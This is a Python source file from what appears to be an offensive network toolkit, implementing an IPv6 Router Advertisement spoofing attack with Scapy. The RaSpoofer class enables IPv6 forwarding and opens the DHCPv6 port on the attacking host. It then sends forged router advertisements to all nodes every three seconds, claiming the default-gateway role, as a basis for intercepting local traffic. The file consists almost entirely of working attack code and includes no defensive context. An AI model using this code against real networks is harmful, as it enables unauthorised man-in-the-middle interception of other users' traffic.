# ============================================================
#  File: vanta/attacks/ra.py
# ============================================================
import time
from scapy.all import (  # type: ignore
    Ether, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptSrcLLAddr, IPv6, sendp,
)

from .base import Attack
from ..core.iface import require_root
from ..core.errors import AttackError


class RaSpoofer(Attack):
    """
    Sends periodic ICMPv6 Router Advertisements claiming to be the
    default gateway for the local link. Combined with a rogue DHCPv6
    DNS this MITMs IPv6 traffic (which many stacks prefer over IPv4).
    """

    NAME = "ipv6-ra"

    def setup(self):
        require_root()
        iface = self.cfg.require_interface()

        # --- auto-manage kernel params ---
        from ..core import Sysctl
        self._sysctl = Sysctl(self.log)
        self._sysctl.enable_ipv6_forwarding()
        self._sysctl.silence_ipv6_autoconf(iface)

        # --- auto-open firewall (none needed for outbound multicast,
        #     but leave hook for future RDNSS/DHCPv6) ---
        from ..core import Firewall
        self._fw = Firewall(self.log)
        self._fw.open_udp(547)  # DHCPv6 server port, harmless

        # --- MAC / link-local ---
        if not self.cfg.attacker_mac:
            from scapy.all import get_if_hwaddr  # type: ignore
            self.cfg.attacker_mac = get_if_hwaddr(iface)
        mac = self.cfg.attacker_mac.replace(":", "")
        b = bytes.fromhex(mac)
        b = bytes([b[0] ^ 0x02]) + b[1:3] + b"\xff\xfe" + b[3:]
        self.ll = "fe80::" + ":".join(
            f"{x:02x}{y:02x}" for x, y in zip(b[0::2], b[1::2]))

    def teardown(self):
        if getattr(self, "_sysctl", None):
            self._sysctl.restore_all()
        if getattr(self, "_fw", None):
            self._fw.close_all()

    def _run(self):
        iface = self.cfg.iface
        interval = 3.0
        count = 0
        while not self._stop.is_set():
            pkt = (
                Ether(src=self.cfg.attacker_mac, dst="33:33:00:00:00:01") /
                IPv6(src=self.ll, dst="ff02::1") /
                ICMPv6ND_RA(
                    chlim=64,
                    M=0, O=1,
                    routerlifetime=1800,
                    reachabletime=0,
                    retranstimer=0,
                ) /
                ICMPv6NDOptSrcLLAddr(lladdr=self.cfg.attacker_mac) /
                ICMPv6NDOptPrefixInfo(
                    prefixlen=64,
                    L=1, A=1,
                    validlifetime=2592000,
                    preferredlifetime=604800,
                    prefix="fd00:dead:beef:1::",
                )
            )
            try:
                sendp(pkt, iface=iface, verbose=False)
                count += 1
                self.stats["ra_sent"] = count
            except Exception as e:
                self.log.warn(f"RA send error: {e}")
            self._stop.wait(interval)
